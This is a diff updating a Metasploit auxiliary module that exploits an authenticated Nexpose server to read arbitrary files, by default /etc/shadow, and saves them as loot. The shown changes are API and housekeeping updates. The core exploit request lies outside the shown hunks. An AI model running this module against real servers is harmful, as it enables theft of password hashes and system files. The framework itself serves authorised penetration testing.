@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rapid7/nexpose'
+require 'nexpose'
 
-class Metasploit4 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -29,9 +27,7 @@ class Metasploit4 < Msf::Auxiliary
       'License' => MSF_LICENSE,
       'References'  =>
         [
-          [ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ],
-          # Fill this in with the direct advisory URL from Infigo
-          [ 'URL', 'http://www.infigo.hr/in_focus/advisories/' ]
+          [ 'URL', 'https://community.rapid7.com/community/nexpose/blog/2013/08/16/r7-vuln-2013-07-24' ]
         ],
       'DefaultOptions' => {
         'SSL' => true
@@ -44,28 +40,28 @@ class Metasploit4 < Msf::Auxiliary
       OptString.new('USERNAME', [true, "The Nexpose user", nil]),
       OptString.new('PASSWORD', [true, "The Nexpose password", nil]),
       OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"])
-    ], self.class)
+    ])
   end
 
   def run
     user = datastore['USERNAME']
     pass = datastore['PASSWORD']
-    prot = ssl ? 'https' : 'http'
+    trust_store = datastore['TRUST_STORE']
 
-    nsc = Nexpose::Connection.new(rhost, user, pass, rport)
+    nsc = Nexpose::Connection.new(rhost, user, pass, rport, nil, nil, trust_store)
 
     print_status("Authenticating as: " << user)
     begin
       nsc.login
-      report_auth_info(
-        :host   => rhost,
-        :port   => rport,
-        :sname  => prot,
-        :user   => user,
-        :pass   => pass,
-        :proof  => '',
-        :active => true
-      )
+
+      connection_details = {
+          module_fullname: self.fullname,
+          username: user,
+          private_data: pass,
+          private_type: :password,
+          status: Metasploit::Model::Login::Status::UNTRIED
+      }.merge(service_details)
+      create_credential_and_login(connection_details)
 
     rescue
       print_error("Error authenticating, check your credentials")
@@ -117,7 +113,7 @@ class Metasploit4 < Msf::Auxiliary
 
     print_status("Cleaning up")
     begin
-      nsc.site_delete id
+      nsc.delete_site id
     rescue
       print_warning("Error while cleaning up site ID, manual cleanup required!")
     end
@@ -130,5 +126,4 @@ class Metasploit4 < Msf::Auxiliary
     path = store_loot('nexpose.file','text/plain', rhost, doc.root.elements["//host"].first.to_s, "File from Nexpose server #{rhost}")
     print_good("File saved to path: " << path)
   end
-
 end
